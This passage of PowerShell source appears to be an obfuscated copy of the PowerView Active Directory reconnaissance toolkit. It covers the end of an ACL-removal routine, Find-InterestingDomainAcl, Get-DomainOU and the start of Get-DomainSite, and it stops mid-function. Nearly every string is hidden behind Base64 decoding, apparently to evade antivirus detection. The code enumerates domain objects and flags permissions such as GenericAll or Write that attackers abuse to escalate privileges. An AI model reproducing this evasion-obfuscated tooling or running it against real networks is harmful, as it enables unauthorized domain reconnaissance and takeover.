                        Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W1JlbW92ZS1Eb21haW5PYmplY3RBY2xdIEdyYW50aW5nIHByaW5jaXBhbCB7MH0gcmlnaHRzIEdVSUQgJ3sxfScgb24gezJ9"))) -f $($PrincipalObject.distinguishedname), $($ACE.ObjectType), $($TargetObject.Properties.distinguishedname))
                        $TargetEntry = $TargetObject.GetDirectoryEntry()
                        $TargetEntry.PsBase.Options.SecurityMasks = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RGFjbA==")))
                        $TargetEntry.PsBase.ObjectSecurity.RemoveAccessRule($ACE)
                        $TargetEntry.PsBase.CommitChanges()
                    }
                }
                catch {
                    Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W1JlbW92ZS1Eb21haW5PYmplY3RBY2xdIEVycm9yIHJlbW92aW5nIHByaW5jaXBhbCB7MH0gJyRSaWdodHMnIGZyb20gezF9IDogezJ9"))) -f $($PrincipalObject.distinguishedname), $($TargetObject.Properties.distinguishedname), $_)
                }
            }
        }
    }
}


function Find-InterestingDomainAcl {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.ACL')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DomainName', 'Name')]
        [String]
        $Domain,

        [Switch]
        $ResolveGUIDs,

        [String]
        [ValidateSet('All', 'ResetPassword', 'WriteMembers')]
        $RightsFilter,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3VidHJlZQ=="))),

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [Switch]
        $Tombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        $ACLArguments = @{}
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzb2x2ZUdVSURz")))]) { $ACLArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzb2x2ZUdVSURz")))] = $ResolveGUIDs }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmlnaHRzRmlsdGVy")))]) { $ACLArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmlnaHRzRmlsdGVy")))] = $RightsFilter }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TERBUEZpbHRlcg==")))]) { $ACLArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TERBUEZpbHRlcg==")))] = $LDAPFilter }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))]) { $ACLArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))] = $SearchBase }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))]) { $ACLArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))] = $Server }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))]) { $ACLArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))] = $SearchScope }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))]) { $ACLArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))] = $ResultPageSize }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))]) { $ACLArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))] = $ServerTimeLimit }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))]) { $ACLArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))] = $Tombstone }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $ACLArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }

        $ObjectSearcherArguments = @{
            ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJvcGVydGllcw=="))) = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("c2FtYWNjb3VudG5hbWUsb2JqZWN0Y2xhc3M=")))
            ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmF3"))) = $True
        }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))]) { $ObjectSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))] = $Server }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))]) { $ObjectSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))] = $SearchScope }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))]) { $ObjectSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))] = $ResultPageSize }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))]) { $ObjectSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))] = $ServerTimeLimit }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))]) { $ObjectSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))] = $Tombstone }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $ObjectSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }

        $ADNameArguments = @{}
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))]) { $ADNameArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))] = $Server }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $ADNameArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }

        
        $ResolvedSIDs = @{}
    }

    PROCESS {
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))]) {
            $ACLArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $Domain
            $ADNameArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $Domain
        }

        Get-DomainObjectAcl @ACLArguments | ForEach-Object {

            if ( ($_.ActiveDirectoryRights -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R2VuZXJpY0FsbHxXcml0ZXxDcmVhdGV8RGVsZXRl")))) -or (($_.ActiveDirectoryRights -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RXh0ZW5kZWRSaWdodA==")))) -and ($_.AceQualifier -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QWxsb3c=")))))) {
                
                if ($_.SecurityIdentifier.Value -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XlMtMS01LS4qLVsxLTldXGR7Myx9JA==")))) {
                    if ($ResolvedSIDs[$_.SecurityIdentifier.Value]) {
                        $IdentityReferenceName, $IdentityReferenceDomain, $IdentityReferenceDN, $IdentityReferenceClass = $ResolvedSIDs[$_.SecurityIdentifier.Value]

                        $InterestingACL = New-Object PSObject
                        $InterestingACL | Add-Member NoteProperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T2JqZWN0RE4="))) $_.ObjectDN
                        $InterestingACL | Add-Member NoteProperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QWNlUXVhbGlmaWVy"))) $_.AceQualifier
                        $InterestingACL | Add-Member NoteProperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QWN0aXZlRGlyZWN0b3J5UmlnaHRz"))) $_.ActiveDirectoryRights
                        if ($_.ObjectAceType) {
                            $InterestingACL | Add-Member NoteProperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T2JqZWN0QWNlVHlwZQ=="))) $_.ObjectAceType
                        }
                        else {
                            $InterestingACL | Add-Member NoteProperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T2JqZWN0QWNlVHlwZQ=="))) ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Tm9uZQ==")))
                        }
                        $InterestingACL | Add-Member NoteProperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QWNlRmxhZ3M="))) $_.AceFlags
                        $InterestingACL | Add-Member NoteProperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QWNlVHlwZQ=="))) $_.AceType
                        $InterestingACL | Add-Member NoteProperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SW5oZXJpdGFuY2VGbGFncw=="))) $_.InheritanceFlags
                        $InterestingACL | Add-Member NoteProperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VjdXJpdHlJZGVudGlmaWVy"))) $_.SecurityIdentifier
                        $InterestingACL | Add-Member NoteProperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SWRlbnRpdHlSZWZlcmVuY2VOYW1l"))) $IdentityReferenceName
                        $InterestingACL | Add-Member NoteProperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SWRlbnRpdHlSZWZlcmVuY2VEb21haW4="))) $IdentityReferenceDomain
                        $InterestingACL | Add-Member NoteProperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SWRlbnRpdHlSZWZlcmVuY2VETg=="))) $IdentityReferenceDN
                        $InterestingACL | Add-Member NoteProperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SWRlbnRpdHlSZWZlcmVuY2VDbGFzcw=="))) $IdentityReferenceClass
                        $InterestingACL
                    }
                    else {
                        $IdentityReferenceDN = Convert-ADName -Identity $_.SecurityIdentifier.Value -OutputType DN @ADNameArguments
                        

                        if ($IdentityReferenceDN) {
                            $IdentityReferenceDomain = $IdentityReferenceDN.SubString($IdentityReferenceDN.IndexOf(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("REM9"))))) -replace ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("REM9"))),'' -replace ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LA=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Lg==")))
                            
                            $ObjectSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $IdentityReferenceDomain
                            $ObjectSearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SWRlbnRpdHk=")))] = $IdentityReferenceDN
                            
                            $Object = Get-DomainObject @ObjectSearcherArguments

                            if ($Object) {
                                $IdentityReferenceName = $Object.Properties.samaccountname[0]
                                if ($Object.Properties.objectclass -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Y29tcHV0ZXI=")))) {
                                    $IdentityReferenceClass = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Y29tcHV0ZXI=")))
                                }
                                elseif ($Object.Properties.objectclass -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Z3JvdXA=")))) {
                                    $IdentityReferenceClass = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Z3JvdXA=")))
                                }
                                elseif ($Object.Properties.objectclass -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("dXNlcg==")))) {
                                    $IdentityReferenceClass = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("dXNlcg==")))
                                }
                                else {
                                    $IdentityReferenceClass = $Null
                                }

                                
                                $ResolvedSIDs[$_.SecurityIdentifier.Value] = $IdentityReferenceName, $IdentityReferenceDomain, $IdentityReferenceDN, $IdentityReferenceClass

                                $InterestingACL = New-Object PSObject
                                $InterestingACL | Add-Member NoteProperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T2JqZWN0RE4="))) $_.ObjectDN
                                $InterestingACL | Add-Member NoteProperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QWNlUXVhbGlmaWVy"))) $_.AceQualifier
                                $InterestingACL | Add-Member NoteProperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QWN0aXZlRGlyZWN0b3J5UmlnaHRz"))) $_.ActiveDirectoryRights
                                if ($_.ObjectAceType) {
                                    $InterestingACL | Add-Member NoteProperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T2JqZWN0QWNlVHlwZQ=="))) $_.ObjectAceType
                                }
                                else {
                                    $InterestingACL | Add-Member NoteProperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("T2JqZWN0QWNlVHlwZQ=="))) ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Tm9uZQ==")))
                                }
                                $InterestingACL | Add-Member NoteProperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QWNlRmxhZ3M="))) $_.AceFlags
                                $InterestingACL | Add-Member NoteProperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("QWNlVHlwZQ=="))) $_.AceType
                                $InterestingACL | Add-Member NoteProperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SW5oZXJpdGFuY2VGbGFncw=="))) $_.InheritanceFlags
                                $InterestingACL | Add-Member NoteProperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VjdXJpdHlJZGVudGlmaWVy"))) $_.SecurityIdentifier
                                $InterestingACL | Add-Member NoteProperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SWRlbnRpdHlSZWZlcmVuY2VOYW1l"))) $IdentityReferenceName
                                $InterestingACL | Add-Member NoteProperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SWRlbnRpdHlSZWZlcmVuY2VEb21haW4="))) $IdentityReferenceDomain
                                $InterestingACL | Add-Member NoteProperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SWRlbnRpdHlSZWZlcmVuY2VETg=="))) $IdentityReferenceDN
                                $InterestingACL | Add-Member NoteProperty ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("SWRlbnRpdHlSZWZlcmVuY2VDbGFzcw=="))) $IdentityReferenceClass
                                $InterestingACL
                            }
                        }
                        else {
                            Write-Warning (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0ZpbmQtSW50ZXJlc3RpbmdEb21haW5BY2xdIFVuYWJsZSB0byBjb252ZXJ0IFNJRCAnezB9JyB0byBhIGRpc3Rpbmd1aXNoZWRuYW1lIHdpdGggQ29udmVydC1BRE5hbWU="))) -f $($_.SecurityIdentifier.Value ))
                        }
                    }
                }
            }
        }
    }
}


function Get-DomainOU {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.OU')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [String[]]
        $Identity,

        [ValidateNotNullOrEmpty()]
        [String]
        [Alias('GUID')]
        $GPLink,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3VidHJlZQ=="))),

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,

        [Switch]
        $Tombstone,

        [Alias('ReturnOne')]
        [Switch]
        $FindOne,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $Raw
    )

    BEGIN {
        $SearcherArguments = @{}
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $Domain }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJvcGVydGllcw==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJvcGVydGllcw==")))] = $Properties }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))] = $SearchBase }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVy")))] = $Server }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoU2NvcGU=")))] = $SearchScope }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmVzdWx0UGFnZVNpemU=")))] = $ResultPageSize }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VydmVyVGltZUxpbWl0")))] = $ServerTimeLimit }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VjdXJpdHlNYXNrcw==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VjdXJpdHlNYXNrcw==")))] = $SecurityMasks }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("VG9tYnN0b25l")))] = $Tombstone }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q3JlZGVudGlhbA==")))] = $Credential }
        $OUSearcher = Get-DomainSearcher @SearcherArguments
    }

    PROCESS {
        if ($OUSearcher) {
            $IdentityFilter = ''
            $Filter = ''
            $Identity | Where-Object {$_} | ForEach-Object {
                $IdentityInstance = $_.Replace(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KA=="))), ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XDI4")))).Replace(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KQ=="))), ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XDI5"))))
                if ($IdentityInstance -match ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Xk9VPS4q")))) {
                    $IdentityFilter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KGRpc3Rpbmd1aXNoZWRuYW1lPSRJZGVudGl0eUluc3RhbmNlKQ==")))
                    if ((-not $PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))]) -and (-not $PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))])) {
                        
                        
                        $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("REM9"))))) -replace ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("REM9"))),'' -replace ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("LA=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Lg==")))
                        Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5PVV0gRXh0cmFjdGVkIGRvbWFpbiAnJElkZW50aXR5RG9tYWluJyBmcm9tICckSWRlbnRpdHlJbnN0YW5jZQ==")))
                        $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $IdentityDomain
                        $OUSearcher = Get-DomainSearcher @SearcherArguments
                        if (-not $OUSearcher) {
                            Write-Warning ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5PVV0gVW5hYmxlIHRvIHJldHJpZXZlIGRvbWFpbiBzZWFyY2hlciBmb3IgJyRJZGVudGl0eURvbWFpbg==")))
                        }
                    }
                }
                else {
                    try {
                        $GuidByteString = (-Join (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object {$_.ToString(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("WA==")))).PadLeft(2,([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("MA=="))))})) -Replace ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KC4uKQ=="))),([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("XCQx")))
                        $IdentityFilter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KG9iamVjdGd1aWQ9JEd1aWRCeXRlU3RyaW5nKQ==")))
                    }
                    catch {
                        $IdentityFilter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KG5hbWU9JElkZW50aXR5SW5zdGFuY2Up")))
                    }
                }
            }
            if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {
                $Filter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KHwkSWRlbnRpdHlGaWx0ZXIp")))
            }

            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("R1BMaW5r")))]) {
                Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5PVV0gU2VhcmNoaW5nIGZvciBPVXMgd2l0aCAkR1BMaW5rIHNldCBpbiB0aGUgZ3BMaW5rIHByb3BlcnR5")))
                $Filter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KGdwbGluaz0qJEdQTGluayop")))
            }

            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("TERBUEZpbHRlcg==")))]) {
                Write-Verbose ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5PVV0gVXNpbmcgYWRkaXRpb25hbCBMREFQIGZpbHRlcjogJExEQVBGaWx0ZXI=")))
                $Filter += ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("JExEQVBGaWx0ZXI=")))
            }

            $OUSearcher.filter = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("KCYob2JqZWN0Q2F0ZWdvcnk9b3JnYW5pemF0aW9uYWxVbml0KSRGaWx0ZXIp")))
            Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5PVV0gR2V0LURvbWFpbk9VIGZpbHRlciBzdHJpbmc6IHswfQ=="))) -f $($OUSearcher.filter))

            if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RmluZE9uZQ==")))]) { $Results = $OUSearcher.FindOne() }
            else { $Results = $OUSearcher.FindAll() }
            $Results | Where-Object {$_} | ForEach-Object {
                if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UmF3")))]) {
                    
                    $OU = $_
                }
                else {
                    $OU = Convert-LDAPProperty -Properties $_.Properties
                }
                $OU.PSObject.TypeNames.Insert(0, ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UG93ZXJWaWV3Lk9V"))))
                $OU
            }
            if ($Results) {
                try { $Results.dispose() }
                catch {
                    Write-Verbose (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("W0dldC1Eb21haW5PVV0gRXJyb3IgZGlzcG9zaW5nIG9mIHRoZSBSZXN1bHRzIG9iamVjdDogezB9"))) -f $_)
                }
            }
            $OUSearcher.dispose()
        }
    }
}


function Get-DomainSite {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.Site')]
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('Name')]
        [String[]]
        $Identity,

        [ValidateNotNullOrEmpty()]
        [String]
        [Alias('GUID')]
        $GPLink,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U3VidHJlZQ=="))),

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,

        [Switch]
        $Tombstone,

        [Alias('ReturnOne')]
        [Switch]
        $FindOne,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $Raw
    )

    BEGIN {
        $SearcherArguments = @{
            'SearchBasePrefix' = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("Q049U2l0ZXMsQ049Q29uZmlndXJhdGlvbg==")))
        }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("RG9tYWlu")))] = $Domain }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJvcGVydGllcw==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("UHJvcGVydGllcw==")))] = $Properties }
        if ($PSBoundParameters[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))]) { $SearcherArguments[([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("U2VhcmNoQmFzZQ==")))] = $SearchBase }
